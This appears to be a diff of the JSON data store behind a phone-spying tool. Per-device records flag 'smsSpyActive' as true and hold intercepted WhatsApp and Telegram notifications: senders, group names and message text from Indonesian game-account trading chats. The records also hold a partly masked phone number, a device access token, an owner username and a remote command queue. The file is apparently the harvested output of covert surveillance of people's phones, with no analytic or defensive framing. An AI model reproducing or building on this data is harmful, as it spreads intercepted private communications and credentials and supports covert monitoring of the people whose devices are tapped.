@@ -6331,6 +6331,46 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎JB || MANZZ KALBAR (964 pesan): ~ p",
+        "content": "📷 op? \nlog bind\nmax1\nblue lock on",
+        "time": "21/04 20:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778548531
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (115 pesan): ~ TUPPALSTORE",
+        "content": "📷 🌊🌊🌊",
+        "time": "21/04 20:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778548209
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ZUNZ PEKALONGAN (965 pesan): ~ dodooo",
+        "content": "ajak MC lu aja bg",
+        "time": "21/04 20:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778547900
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB JB APK BUG BY ZIDE × KYY😈 (6 pesan): ~ -Pr1nce★!🦸",
+        "content": ".",
+        "time": "21/04 20:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778547532
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB1 ALDY BANYUMAS JATENG (69 pesan): ~ reall rezzsturr",
+        "content": "📷 4PAS RAME INF0 41 PM\nLOG BIND ALL AMAN REBIND AE KE MAIL POLOSMU",
+        "time": "21/04 20:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778547152
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎GB || VANSS STOREE V¹ (31 pesan): Menyebut Anda",
         "content": "~ Vvccc: JB All GEME KALIAN LAGI CARI AKUN/JUAL AKUN GAS JOIN GROUP DI BAWAH GROUP LAGI DI PP BANG BOMEL BANYAK AKUN MURAH YANG PASTINYA AMAN DAN BERGARANSI 👇🤩\n\nhttps://chat.whatsapp.com/E52L2epuysHF27BiVxW51z?mode=gi_\n\n`-3 MEM KU ACC BAKAL ADAIN DEGET GAS JOIN SEBELUM KETINGGALAN 🤑 🤑`",
         "time": "21/04 20:35",
@@ -10288,46 +10328,6 @@
         "time": "21/04 20:00",
         "pkg": "com.whatsapp",
         "receivedAt": 1776776405040
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3447 pesan dari 20 chat",
-        "time": "21/04 19:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776776398731
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ZUNZ PEKALONGAN (958 pesan): ~ ALIF STECU",
-        "content": "Minat pm",
-        "time": "21/04 19:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776776398674
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || RULZ STORE KALBAR (655 pesan): ~ JB RENZ SMITH KALBAR",
-        "content": "📷 130K log bind",
-        "time": "21/04 19:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776776394999
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (90 pesan): ~ OISHIX STORE REAL",
-        "content": "📷 Last 430?",
-        "time": "21/04 19:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776776394880
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (5 pesan): ~ N9THCRAL",
-        "content": "💟 Stiker",
-        "time": "21/04 19:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776776394825
       }
     ],
     "galleryPhotos": [],
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 20:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778548983
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -14394,14 +14402,6 @@
         "time": "21/04 20:24",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776777889082
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: WhatsApp\n• Negara: Indonesia 🇮🇩\n• Server: Server (1)\n• Nomor: +6283*******26\n• Waktu: 21/04/2026, 20.23",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777889038
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776778545691,
+    "lastSeen": 1776778547900,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
